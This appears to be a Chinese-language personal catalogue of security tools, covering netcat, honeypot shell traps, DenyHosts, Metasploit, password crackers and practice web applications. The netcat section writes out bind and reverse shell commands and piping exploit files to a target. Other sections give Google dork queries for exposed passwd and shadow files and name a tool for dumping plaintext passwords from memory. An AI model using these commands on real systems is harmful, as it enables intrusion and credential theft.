# Tools {#tools}

### note {#note}

nessue

x-scan

cain

基线扫描

漏洞扫描

应用扫描

诺基亚西门子

安全测试工具收集

[http://kuwoleft.iteye.com/blog/1274233](http://kuwoleft.iteye.com/blog/1274233)

[http://touchmm.iteye.com/blog/1106493](http://touchmm.iteye.com/blog/1106493)

2006年100款最佳安全工具谱

[http://xiaoruanjian.iteye.com/blog/1376632](http://xiaoruanjian.iteye.com/blog/1376632)

### netcat {#netcat}

GUN NatCat ：

[http://netcat.sourceforge.net/download.php](http://netcat.sourceforge.net/download.php)

NC for NT：

www.vulnwatch.org/netcat/

netcat被誉为网络安全界的&amp;apos;瑞士军刀&amp;apos;，相信没有什么人不认识它吧......

 一个简单而有用的工具，透过使用TCP或UDP协议的网络连接去读写数据。它被设计成一个稳定的后门工具，

能够直接由其它程序和脚本轻松驱动。同时，它也是一个功能强大的网络调试和探测工具，能够建立你需要的几

乎所有类型的网络连接，还有几个很有意思的内置功能(详情请看下面的使用方法)。

 在中国，它的WINDOWS版有两个版本，一个是原创者Chris Wysopal写的原版本，另一个是由&amp;apos;红与黑&amp;apos;编译

后的新&amp;apos;浓缩&amp;apos;版。&amp;apos;浓缩&amp;apos;版的主程序只有10多KB（10多KB的NC是不能完成下面所说的第4、第5种使用方法，

有此功能的原版NC好象要60KB：P），虽然&quot;体积&quot;小，但很完成很多工作。

=====================================================================================================

软件介绍：

工具名：Netcat

作者：Hobbit &amp;&amp; Chris Wysopal

网址： [http://www.atstake.com/research/tools/network_utilities/](http://www.atstake.com/research/tools/network_utilities/)

类别：开放源码

平台：Linux/BSD/Unix/Windows　

WINDOWS下版本号：[v1.10 NT]

=====================================================================================================

参数介绍：

&amp;apos;nc.exe -h&amp;apos;即可看到各参数的使用方法。

基本格式：nc [-options] hostname port[s] [ports] ...

　　 nc -l -p port [options] [hostname] [port]

-d 后台模式

-e prog 程序重定向，一旦连接，就执行 [危险!!]

-g gateway source-routing hop point[s], up to 8

-G num source-routing pointer: 4, 8, 12, ...

-h 帮助信息

-i secs 延时的间隔

-l 监听模式，用于入站连接

-L 连接关闭后,仍然继续监听

-n 指定数字的IP地址，不能用hostname

-o file 记录16进制的传输

-p port 本地端口号

-r 随机本地及远程端口

-s addr 本地源地址

-t 使用TELNET交互方式

-u UDP模式

-v 详细输出--用两个-v可得到更详细的内容

-w secs timeout的时间

-z 将输入输出关掉--用于扫描时

端口的表示方法可写为M-N的范围格式。

=====================================================================================================

基本用法：

大概有以下几种用法：

1)连接到REMOTE主机，例子：

格式：nc -nvv 192.168.x.x 80

讲解：连到192.168.x.x的TCP80端口

2)监听LOCAL主机，例子：

格式：nc -l -p 80

讲解：监听本机的TCP80端口

3)扫描远程主机，例子：

格式：nc -nvv -w2 -z 192.168.x.x 80-445

讲解：扫描192.168.x.x的TCP80到TCP445的所有端口

4)REMOTE主机绑定SHELL，例子：

格式：nc -l -p 5354 -t -e c:\WINDOWS\system32\cmd.exe

讲解：绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口

5)REMOTE主机绑定SHELL并反向连接，例子：

格式：nc -t -e c:\WINDOWS\system32\cmd.exe 192.168.x.x 5354

讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口

以上为最基本的几种用法（其实NC的用法还有很多，

当配合管道命令&quot;|&quot;与重定向命令&quot;&lt;&quot;、&quot;&gt;&quot;等等命令功能更强大......）。

=====================================================================================================

高级用法：

6)作攻击程序用，例子：

格式1：type.exe c:\exploit.txt|nc -nvv 192.168.x.x 80

格式2：nc -nvv 192.168.x.x 80 &lt; c:\exploit.txt

讲解：连接到192.168.x.x的80端口，并在其管道中发送&amp;apos;c:\exploit.txt&amp;apos;的内容(两种格式确有相同的效果，

　 真是有异曲同工之妙:P)

附：&amp;apos;c:\exploit.txt&amp;apos;为shellcode等

7)作蜜罐用[1]，例子：

格式：nc -L -p 80

讲解：使用&amp;apos;-L&amp;apos;(注意L是大写)可以不停地监听某一个端口，直到ctrl+c为止

8)作蜜罐用[2]，例子：

格式：nc -L -p 80 &gt; c:\log.txt

讲解：使用&amp;apos;-L&amp;apos;可以不停地监听某一个端口，直到ctrl+c为止，同时把结果输出到&amp;apos;c:\log.txt&amp;apos;中，如果把&amp;apos;&gt;&amp;apos;

　 改为&amp;apos;&gt;&gt;&amp;apos;即可以追加日志

附：&amp;apos;c:\log.txt&amp;apos;为日志等

9)作蜜罐用[3]，例子：

格式1：nc -L -p 80 &lt; c:\honeypot.txt

格式2：type.exe c:\honeypot.txt|nc -L -p 80

讲解：使用&amp;apos;-L&amp;apos;可以不停地监听某一个端口，直到ctrl+c为止，并把&amp;apos;c:\honeypot.txt&amp;apos;的内容&amp;apos;送&amp;apos;入其管道中！

### Honeynet {#honeynet}

www.honeynet.org

www.honeynet.org.tw

[http://netsecurity.51cto.com/art/201106/271995.htm](http://netsecurity.51cto.com/art/201106/271995.htm)

1.Kippo   工具实现

[http://code.google.com/p/kippo/](http://code.google.com/p/kippo/)

2.脚本实现

2.1当黑客以root身份登录时：

一般情况下，只要用户输入的用户名和口令正确，就能顺利进入系统。如果我们在进入系统时设置了陷阱，并使黑客对此防不胜防，就会大大提高入侵的难度系数。例如，当黑客已获取正确的root口令，并以root身份登录时，我们在此设置一个迷魂阵，提示它，你输入的口令错误，并让它重输用户名和口令。而其实，这些提示都是虚假的，只要在某处输入一个密码就可通过。黑客因此就掉入这个陷阱，不断地输入root用户名和口令，却不断地得到口令错误的提示，从而使它怀疑所获口令的正确性，放弃入侵的企图。

给超级用户也就是root用户设置陷阱，并不会给系统带来太多的麻烦，因为，拥有root口令的人数不会太多，为了系统的安全，稍微增加一点复杂性也是值得的。这种陷阱的设置时很方便的，我们只要在root用户的.profile中加一段程序就可以了。我们完全可以在这段程序中触发其他入侵检测与预警控制程序。陷阱程序如下：

#you need type correct key(not you password) to login

#disable ctrl+c key:

stty intr undef

clear

echo &quot;You had input an error password , please input again !&quot;

echo    

echo  -n &quot;Login:&quot;

read p

if [ &quot;$p&quot; = &quot;123456&quot; ]

then

       clear

else

       sh sh-logout

fi

#enable ctrl+c key:

stty intr ^c

2.2当黑客用su命令转换成root身份时：

在很多情况下，黑客会通过su命令转换成root身份，因此，必须在此设置陷阱。当黑客使用su命令，并输入正确的root口令时，也应该报错，以此来迷惑它，使它误认为口令错误，从而放弃入侵企图。这种陷阱的设置也很简单，你可以在系统的/etc/profile文件中设置一个alias，把su命令重新定义成转到普通用户的情况就可以了，例如alias su=&quot;su user1&quot;。这样，当使用su时，系统判断的是user1的口令，而不是root的口令，当然不能匹配。即使输入su root也是错误的，也就是说，从此屏蔽了转向root用户的可能性。

alias alias=&amp;apos;alias 1&gt;/dev/null&amp;apos;

alias su= &amp;apos;su nobody&amp;apos;

2.3当黑客以root身份成功登录后一段时间内：

如果前两种设置都失效了，黑客已经成功登录，就必须启用登录成功的陷阱。一旦root用户登录，就可以启动一个计时器，正常的root登录就能停止计时，而非法入侵者因不知道何处有计时器，就无法停止计时，等到一个规定的时间到，就意味着有黑客入侵，需要触发必要的控制程序，如关机处理等，以免造成损害，等待系统管理员进行善后处理。陷阱程序如下：

times=0

while [ $times -le 5 ]

do

sleep 1

times=$[times + 1]

done

logout

### DenyHosts {#denyhosts}

DenyHosts 介绍

DenyHosts是Python语言写的一个程序，它会分析sshd的日志文件（默认是/var/log/secure），当发现重复的攻击时就会记录IP到/etc/hosts.deny文件，启用tcp_wrappers，从而达到自动屏IP的功能。 通过 [http://denyhosts.sourceforge.net](http://denyhosts.sourceforge.net) 可以下载DenyHosts的程序，可以直接下载rpm包来安装，也可以通过src.rpm包重新编译并安装等，通过这种方式默认是安装在/usr/share/denyhosts目录下。

DenyHosts的配置

1、启动DenyHosts 手动执行/usr/bin/denyhosts.py并指定其配置文件即可启动DenyHosts服务，如下：

# /usr/bin/denyhosts.py --daemon --config=/usr/share/denyhosts/denyhosts.cfg-dist

其中-daemon表示在后台运行，也可以直接执行自带/usr/share/denyhosts/daemon-control-dist脚本，因为daemon-control-dist脚本指定的配置文件名是&quot;denyhosts.cfg&quot;，所以在执行该脚本前需要将配置文件重命名。如下：

# mv denyhosts.cfg-dist denyhosts.cfg

# ./daemon-control-dist start

若要设置开机自动启动，则将该脚本做一个链接到/etc/init.d目录下，如下：

# ln -s /usr/share/denyhosts/daemon-control-dist /etc/init.d

# chkconfig daemon-control-dist on

关于denyhosts.cfg配置文件的常用参数解释如下：

SECURE_LOG = /var/log/secure

#ssh 日志文件，如果是redhat系列是根据/var/log/secure文件来判断的。

#Mandrake、FreeBSD是根据 /var/log/auth.log来判断的，而SUSE则是用/var/log/messages来判断的。这些在配置文件里面都有很详细的解释。

HOSTS_DENY = /etc/hosts.deny

#控制用户登陆的文件

PURGE_DENY = 30m

#过多久后清除已经禁止的，

#            &amp;apos;m&amp;apos; = minutes

#            &amp;apos;h&amp;apos; = hours

#            &amp;apos;d&amp;apos; = days

#            &amp;apos;w&amp;apos; = weeks

#            &amp;apos;y&amp;apos; = years

BLOCK_SERVICE = sshd

#禁止的服务名，当然DenyHost不仅仅用于SSH服务，还可用于SMTP等等。

DENY_THRESHOLD_INVALID = 1

#允许无效用户失败的次数

DENY_THRESHOLD_VALID = 5

#允许普通用户登陆失败的次数

DENY_THRESHOLD_ROOT = 3

#允许root登陆失败的次数

HOSTNAME_LOOKUP=NO

#是否做域名反解

ADMIN_EMAIL = iakuf@163.com

#管理员邮件地址,它会给管理员发邮件

DAEMON_LOG = /var/log/denyhosts

#DenyHosts日志文件存放的路径

配置完成后，再重新启动DenyHosts服务，然后在一个客户端尝试输入密码错误，看看/etc/hosts.deny文件里面是不是有类似如下的记录：

# DenyHosts: Sat Oct 13 20:47:14 2007 | sshd: 172.16.78.110

sshd: 172.16.78.110

如果有表明DenyHosts启用成功。

### Metasploit {#metasploit}

Metasploit 主页: [http://www.metasploit.com](http://www.metasploit.com)    你可以通过这个网站掌握最新的架构以及漏洞利用的版本

Metasploit Framework下载地址： [http://www.metasploit.com/projects/Framework/downloads.html](http://www.metasploit.com/projects/Framework/downloads.html) （下载所用操作系统支持的版本）

Exploit的相关信息: [http://metasploit.com/projects/Framework/exploits.html](http://metasploit.com/projects/Framework/exploits.html)

Metasploit Framework (MSF)是以开放源代码方式发布、可自由获取的开发框架，这个环境为渗透测试、shellcode 编写和漏洞研究提供了一个可靠的平台。这个框架主要是由Ruby编写的，并带有一些C语言和汇编语言组件。它集成了各平台上常见的溢出漏洞和流行的 shellcode，并且不断更新。作为安全工具，它在安全检测中起到不容忽视的作用，使得缓冲区溢出测试变得方便和简单，为漏洞自动化探测和及时检测系统漏洞提供有力的保障。

### www.try2hack.nl {#www-try2hack-nl}

### security-oriented {#security-oriented}

### Tools SQL inject {#tools-sql-inject}

[http://netsecurity.51cto.com/art/201108/287651.htm](http://netsecurity.51cto.com/art/201108/287651.htm)

#### Pangolin {#pangolin}

#### Havij {#havij}

### Tools XSS {#tools-xss}

#### beef {#beef}

### Tools Password {#tools-password}

#### John the Ripper {#john-the-ripper}

intitle:welcome to iis 4.0&quot;

&quot;vnc desktop&quot; inurl:5800

filetype:pwd service

filetype:bak inurl:&quot;htaccess|passwd|shadow|htusers&quot;

filetype:properties inurl:db intext:password

&quot;not for distribution&quot; confidential site:edu

John the Ripper

      免费的开源软件，是一个快速的密码破解工具，用于在已知密文的情况下尝试破解出明文的破解密码软件，支持目前大多数的加密算法，如DES、 MD4、MD5等。它支持多种不同类型的系统架构，包括Unix、Linux、Windows、DOS模式、BeOS和OpenVMS，主要目的是破解不够牢固的Unix/Linux系统密码。目前的最新版本是John the Ripper 1.7.3版，针对Windows平台的最新免费版为John the Ripper 1.7.0.1版。

John the Ripper的官方网站: [http://www.openwall.com/john/](http://www.openwall.com/john/)

镜像整个web站点工具：

linux/unix :wget

windows:teleprot pro

#### oclHashcat {#oclhashcat}

#### pyrit {#pyrit}

#### L0phtCrack {#l0phtcrack}

#### SAMInside {#saminside}

#### Cain &amp; Abel {#cain-abel}

[http://netsecurity.51cto.com/art/200907/136591.htm](http://netsecurity.51cto.com/art/200907/136591.htm)

#### mimipenguin {#mimipenguin}

下载地址：

https://github.com/huntergregal/mimipenguin

原理类似于mimikatz，通过内存导出明文密码

#### UNIX {#unix}

[https://www.leavesongs.com/PENETRATION/about-hash-password.html](https://www.leavesongs.com/PENETRATION/about-hash-password.html)

### Tools Web Scan {#tools-web-scan}

#### IBM Rational? AppScan {#ibm-rational-appscan}

IBM Rational? AppScan? 是一个领先的 Web 应用安全测试工具，曾以 Watchfire AppScan 的名称享誉业界。Rational AppScan 可自动化 Web 应用的安全漏洞评估工作，能扫描和检测所有常见的 Web 应用安全漏洞，例如 SQL 注入（SQL-injection）、跨站点脚本攻击（cross-site scripting）、缓冲区溢出（buffer overflow）及最新的 Flash/Flex 应用及 Web 2.0 应用曝露等方面安全漏洞的扫描。

下载地址如下：

[http://www.ibm.com/developerworks/cn/downloads/r/appscan/](http://www.ibm.com/developerworks/cn/downloads/r/appscan/)

#### Web Vulnerability Scanner {#web-vulnerability-scanner}

[http://www.acunetix.com/vulnerability-scanner/](http://www.acunetix.com/vulnerability-scanner/)

### Backtrack {#backtrack}

/etc/network/interfaces

[http://www.backtrack-linux.org/](http://www.backtrack-linux.org/)

/lib/modules/2.4.20-8/kernel/drivers/net

2)cp 3c59x.o /lib/modules/2.4.20-8/kernel/drivers/net

3)modprobe 3c59x

4)vi /etc/modprobe.conf

alias eth0 3c59x

5 ）vi /etc/sysconfig/network-script/ifcfg-eth0

DEVICE=eth0

TYPE=Ethernet

HWADDR=00:0C:29:F0:78:4B

BOOTPROTO=dhcp

ONBOOT=yes

[http://book.51cto.com/art/201202/317838.htm](http://book.51cto.com/art/201202/317838.htm)

### Kail Linux {#kail-linux}

[https://www.kali.org/](https://www.kali.org/)

[http://www.backtrack.org.cn](http://www.backtrack.org.cn)

### Anonymous-os {#anonymous-os}

### OpenVAS {#openvas}

### skipfish {#skipfish}

### WireShark {#wireshark}

[http://netsecurity.51cto.com/art/201411/457412_1.htm](http://netsecurity.51cto.com/art/201411/457412_1.htm)         使用WireShark破解网站密码 http.request.method == &quot;POST&quot;

### onion network {#onion-network}

onion.city

[http://22u75kqyl666joi2.onion.city/index.php](http://22u75kqyl666joi2.onion.city/index.php)

导航：

[http://thehiddenwiki.org/](http://thehiddenwiki.org/)

[https://sites.google.com/site/howtoaccessthedeepnet/working-links-to-the-deep-web](https://sites.google.com/site/howtoaccessthedeepnet/working-links-to-the-deep-web)

### Penetration Testing system {#penetration-testing-system}

[http://www.yikeqi.com/230.html](http://www.yikeqi.com/230.html)

**DVWA (Dam Vulnerable Web Application)DVWA** 是用 PHP+Mysql 编写的一套用于常规 WEB 漏洞教学和检测的 WEB 脆弱性测试程序。包含了 SQL 注入、 XSS 、盲注等常见的一些安全漏洞。

链接地址： [\\\\o &quot;&quot; \\\\t &quot;_blank&quot;](http://www.dvwa.co.uk/) http://www.dvwa.co.uk

**mutillidaemutillidae** 是 一个免费，开源的 Web 应用程序，提供专门被允许的安全测试和入侵的 Web 应用程序。它是由 Adrian &quot;Irongeek&quot; Crenshaw 和 Jeremy &quot;webpwnized&quot; Druin. 开发的一款自由和开放源码的 Web 应用程序。其中包含了丰富的渗透测试项目，如 SQL 注入、跨站脚本、 clickjacking 、本地文件包 含、远程代码执行等 .

链接地址： [http://sourceforge.net/projects/mutillidae](http://sourceforge.net/projects/mutillidae)

**SQLolSQLol** 是一个可配置得 SQL 注入测试平台，它包含了一系列的挑战任务，让你在挑战中测试和学习 SQL 注入语句。此程序在 Austin 黑客会议上由 Spider Labs 发布。

链接地址： [https://github.com/SpiderLabs/SQLol](https://github.com/SpiderLabs/SQLol)

**hackxorhackxor** 是由 albino 开发的一个 online 黑客游戏 , 亦可以下载安装完整版进行部署 , 包括常见的 WEB 漏洞演练。包含常见的漏洞 XSS 、 CSRF 、 SQL 注入、 RCE 等。

链接地址： [http://sourceforge.net/projects/hackxor](http://sourceforge.net/projects/hackxor)

**BodgeItBodgeIt** 是一个 Java 编写的脆弱性 WEB 程序。他包含了 XSS 、 SQL 注入、调试代码、 CSRF 、不安全的对象应用以及程序逻辑上面的一些问题。

链接地址： [http://code.google.com/p/bodgeit](http://code.google.com/p/bodgeit)

**Exploit KB / exploit.co.il** 该程序包含了各种存在漏洞的 WEB 应用，可以测试各种 SQL 注入漏洞。此应用程序还包含在 BT5 里面。 ~

链接地址： [http://exploit.co.il/projects/vuln-web-app](http://exploit.co.il/projects/vuln-web-app)

**WackoPickoWackoPicko** 是由 Adam Doupé. 发布的一个脆弱的 Web 应用程序，用于测试 Web 应用程序漏洞扫描工具。它包含了命令行注射、 sessionid 问题、文件包含、参数篡改、 sql 注入、 xss 、 flash form 反射性 xss 、弱口令扫描等。 ~

链接地址： [https://github.com/adamdoupe/WackoPicko](https://github.com/adamdoupe/WackoPicko)

**WebGoatWebGoat** 是由著名的 OWASP 负责维护的一个漏洞百出的 J2EE Web 应用程序，这些漏洞并非程序中的 bug ，而是故意设计用来讲授 Web 应用程序安全课程的。这个应用程序提供了一个逼真的教学环境，为用户完成课程提供了有关的线索。 ~

链接地址： [http://code.google.com/p/webgoat](http://code.google.com/p/webgoat)

**OWASP HackademicOWASP Hackademic~** 是由 OWASP 开发的一个项目，你可以用它来测试各种攻击手法，目前包含了 10 个有问题的 WEB 应用程序。 ~

链接地址： [https://code.google.com/p/owasp-hackademic-challenges](https://code.google.com/p/owasp-hackademic-challenges)

**XSSeducationXSSeducation** 是由 AJ00200 开发的一套专门测试跨站的程序。里面包含了各种场景的测试。 ~

链接地址：